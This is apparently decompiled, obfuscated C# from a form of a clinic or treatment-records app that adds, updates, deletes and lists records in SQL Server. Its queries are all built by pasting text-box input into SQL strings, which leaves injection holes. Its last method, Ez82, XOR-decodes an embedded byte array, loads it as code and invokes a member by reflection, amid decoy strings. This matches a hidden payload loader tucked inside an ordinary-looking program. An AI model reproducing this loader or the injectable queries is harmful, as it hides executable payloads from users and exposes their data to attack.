		//IL_0094: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			Interaction.MsgBox((object)"Enter The Receptionist ID", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		IComparable<string> comparable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delete from ReceptionistTb where RecepID=", NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)""));
		ICloneable cloneable = (ICloneable)new SqlCommand(comparable as string, r.V);
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Receptionist Delete", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void Fw3e(object sender, EventArgs e)
	{
		object obj = new p1HNe2();
		((p1HNe2)obj).e4R9Af();
	}

	private void De89(object sender, EventArgs e)
	{
		object obj = new Jy71To();
		((Jy71To)obj).Df8b9W();
	}

	private void Jm4t(object sender, EventArgs e)
	{
		object obj = new n6R9Wx();
		(obj as n6R9Wx).c7W6Hx();
	}

	private void Xo3t(object sender, EventArgs e)
	{
		object obj = new e1TFq0();
		(obj as e1TFq0).g0DJf5();
	}

	internal void Cy80()
	{
		throw new NotImplementedException();
	}

	private void Na6m(object sender, EventArgs e)
	{
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		r.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" insert into TreatmentTb values(", NewLateBinding.LateGet(r.J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)",'"), NewLateBinding.LateGet(nO, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(r.X, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')"));
		object obj2 = (object)new SqlCommand((string)obj, r.V);
		obj2 = (object)new SqlCommand(obj as string, r.V);
		((SqlCommand)obj2).ExecuteNonQuery();
		Interaction.MsgBox((object)"Treatment Successfully Added", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	public void c1H7()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		r.V.Open();
		IConvertible convertible = "select * from TreatmentTb";
		IDbDataAdapter dbDataAdapter = (IDbDataAdapter)new SqlDataAdapter(convertible as string, r.V);
		MarshalByValueComponent marshalByValueComponent = new DataSet();
		((DbDataAdapter)(SqlDataAdapter)dbDataAdapter).Fill((DataSet)marshalByValueComponent);
		NewLateBinding.LateSet(r.f, (Type)null, "DataSource", new object[1] { (marshalByValueComponent as DataSet).Tables[0] }, (string[])null, (Type[])null);
		r.V.Close();
	}

	private void Jc8z(object sender, EventArgs e)
	{
		c1H7();
	}

	private void Fs39(object sender, EventArgs e)
	{
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Expected O, but got Unknown
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(r.J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(nO, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(r.X, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			Interaction.MsgBox((object)"Incomplete Information", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		DbCommand dbCommand = (DbCommand)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Update TreatmentTb set TreatDesc ='", NewLateBinding.LateGet(nO, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', TreatCost='"), NewLateBinding.LateGet(r.X, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' Where TreatID = "), NewLateBinding.LateGet(r.J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"")), r.V);
		((SqlCommand)dbCommand).ExecuteNonQuery();
		Interaction.MsgBox((object)"Treatment Updated Successfully", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void n3NY(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(r.J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			Interaction.MsgBox((object)"Enter The Treament ID", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delete from TreatmentTb where TreatID=", NewLateBinding.LateGet(r.J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)""));
		DbCommand dbCommand = (DbCommand)new SqlCommand(obj as string, r.V);
		((SqlCommand)dbCommand).ExecuteNonQuery();
		Interaction.MsgBox((object)"Treatment Delete", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void b3F9(object sender, EventArgs e)
	{
		object obj = new Jy71To();
		((Jy71To)obj).Df8b9W();
	}

	private void a8P1(object sender, EventArgs e)
	{
		object obj = new x6WSe8();
		(obj as x6WSe8).c7Q4Sk();
	}

	private void Kd8y(object sender, EventArgs e)
	{
		object obj = new p1HNe2();
		(obj as p1HNe2).e4R9Af();
	}

	private void We18(object sender, EventArgs e)
	{
		object obj = new e1TFq0();
		(obj as e1TFq0).g0DJf5();
	}

	internal void i4FD()
	{
		throw new NotImplementedException();
	}

	internal static void Ez82(Jy71To.g6BLq5 g6BLq5_0, byte[] byte_0, int int_0)
	{
		checked
		{
			Array array = new byte[g6BLq5_0.w.Length - 1 + 1];
			int num = g6BLq5_0.w.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = i + Dw0j.s7AQ(int_0, byte_0.Length, null, null, 1);
				int num3 = num2 & int_0;
				int num4 = Dw0j.s7AQ(i, byte_0.Length, null, null, 1);
				int num5 = byte_0[num4];
				int num6 = Convert.ToInt32(Dw0j.s7AQ(0, 0, num5, num3, 2));
				int num7 = g6BLq5_0.w[i];
				((byte[])array)[i] = (byte)Dw0j.s7AQ(0, 0, num7, num6, 2);
			}
			Array array2 = new object[6];
			((object[])array2)[0] = "Vbcn";
			((object[])array2)[1] = "MczjfkjOADJofQJFLODJCLXK";
			(array2 as object[])[2] = "C ksdjgfdslogpojgijdsiaf";
			RuntimeHelpers.GetObjectValue(Dy0c.f3WK(g6BLq5_0, array as byte[]));
			IComparable<string> comparable = Conversions.ToString(((Type)NewLateBinding.LateGet(g6BLq5_0.T, (Type)null, "GetExportedTypes", new object[1] { g6BLq5_0.F - 27 }, (string[])null, (Type[])null, (bool[])null)).InvokeMember(g6BLq5_0.o.Replace("a", ""), BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
			if ((comparable as string).Equals(g6BLq5_0.o.Replace("z", "")))
			{
			}
		}
	}
}
